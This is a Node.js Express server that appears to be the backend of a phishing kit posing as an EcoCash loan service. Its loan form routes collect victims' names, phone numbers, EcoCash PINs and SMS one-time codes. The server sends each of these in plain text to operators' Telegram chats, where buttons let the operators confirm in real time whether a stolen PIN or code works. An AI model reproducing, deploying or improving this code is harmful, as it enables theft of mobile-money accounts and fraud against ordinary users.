require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';

function loadAdminsFromEnv() {
  const admins = [];
  let index = 1;

  while (process.env[`ADMIN_${index}_CHAT_ID`]) {
    const chatId = process.env[`ADMIN_${index}_CHAT_ID`].trim();
    if (chatId) {
      admins.push({
        key: index === 1 ? 'main' : `admin${index - 1}`,
        name: index === 1 ? 'Main Admin' : `Admin ${String(index - 1).padStart(3, '0')}`,
        chatId: chatId,
        isMain: index === 1
      });
    }
    index++;
  }

  return admins;
}

const ADMINS = loadAdminsFromEnv();
const activeApplications = new Map();

function formatZimbabwePhone(phone) {
  let p = phone || '';
  if (p.startsWith('+263')) p = p.replace('+263', '');
  else if (p.startsWith('263')) p = p.slice(3);
  else if (p.startsWith('0')) p = p.slice(1);
  return p;
}

// TELEGRAM WEBHOOK HANDLER
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  const { message, callback_query } = req.body;

  if (message && message.text && message.text.startsWith('/start')) {
    const chatId = message.chat.id;
    const firstName = message.from.first_name || 'Admin';
    const username = message.from.username ? `@${message.from.username}` : 'Not set';

    let matchedAdmin = ADMINS.find(a => a.chatId && String(a.chatId) === String(chatId));
    const adminKey = matchedAdmin ? matchedAdmin.key : `admin-${chatId.toString().slice(-4)}`;
    const adminRole = matchedAdmin ? matchedAdmin.name : 'Authorized Admin';
    const privateLink = `${APP_URL}/admin/${encodeURIComponent(adminKey)}`;

    const welcomeMsg = `🤖 <b>ECOCASH ADMIN BOT ACTIVATED</b>\n` +
                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                       `👤 <b>User Info:</b>\n` +
                       `• <b>Name:</b> ${firstName}\n` +
                       `• <b>Username:</b> ${username}\n` +
                       `• <b>Chat ID:</b> <code>${chatId}</code>\n` +
                       `• <b>Role:</b> ${adminRole}\n\n` +
                       `🔗 <b>YOUR PRIVATE OPERATIONAL LINK:</b>\n` +
                       `${privateLink}\n\n` +
                       `<i>Click below to open your independent management dashboard.</i>`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: welcomeMsg,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🌐 Open Private Dashboard', url: privateLink }]
          ]
        }
      })
    });
  }

  if (callback_query) {
    const actionData = callback_query.data;
    const chatId = callback_query.message.chat.id;
    const messageId = callback_query.message.message_id;

    if (actionData.startsWith('pin_correct_')) {
      const ref = actionData.replace('pin_correct_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'PIN_APPROVED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN APPROVED ✅</b>`);
    }

    if (actionData.startsWith('pin_wrong_')) {
      const ref = actionData.replace('pin_wrong_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'PIN_REJECTED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN REJECTED ❌</b>`);
    }

    if (actionData.startsWith('otp_correct_')) {
      const ref = actionData.replace('otp_correct_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'LOAN_APPROVED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP & LOAN APPROVED ✅</b>`);
    }

    if (actionData.startsWith('otp_wrong_')) {
      const ref = actionData.replace('otp_wrong_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'OTP_REJECTED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP REJECTED ❌</b>`);
    }
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error(err.message);
  }
}

// RECEIVES COMBINED STEP 1 & STEP 2 DATA AND SENDS TO TELEGRAM AT ONCE
app.post('/api/apply-loan', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    const appData = { ...data, formattedPhone, status: 'PENDING_PIN' };
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (botToken) {
      for (const admin of ADMINS) {
        if (!admin.chatId) continue;
        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `👤 <b>Name:</b> ${data.fullName}\n` +
                        `💼 <b>Occupation:</b> ${data.occupation}\n` +
                        `💵 <b>Income:</b> $${data.monthlyIncome}\n` +
                        `⏳ <b>Repayment Period:</b> ${data.repaymentPeriod} Month(s)\n` +
                        `💰 <b>Amount Requested:</b> $${data.loanAmount}\n` +
                        `📞 <b>Phone:</b> +263${formattedPhone}\n` +
                        `🔑 <b>EcoCash PIN:</b> <code>${data.pin}</code>`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: admin.chatId,
            text: msgText,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
                  { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
                ]
              ]
            }
          })
        });
      }
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  const { appReference, otpCode } = req.body;
  
  if (activeApplications.has(appReference)) {
    const appData = activeApplications.get(appReference);
    appData.status = 'PENDING_OTP';
    appData.otpCode = otpCode;
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    if (botToken) {
      for (const admin of ADMINS) {
        if (!admin.chatId) continue;
        const msgText = `📲 <b>RECEIVED OTP CODE (STEP 3)</b>\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `📞 <b>Phone:</b> +263${appData.formattedPhone}\n` +
                        `🔐 <b>SMS OTP:</b> <code>${otpCode}</code>`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: admin.chatId,
            text: msgText,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
                  { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
                ]
              ]
            }
          })
        });
      }
    }
  }

  res.status(200).json({ success: true });
});

app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);
  if (!appData) return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  res.json({ success: true, status: appData.status });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
        
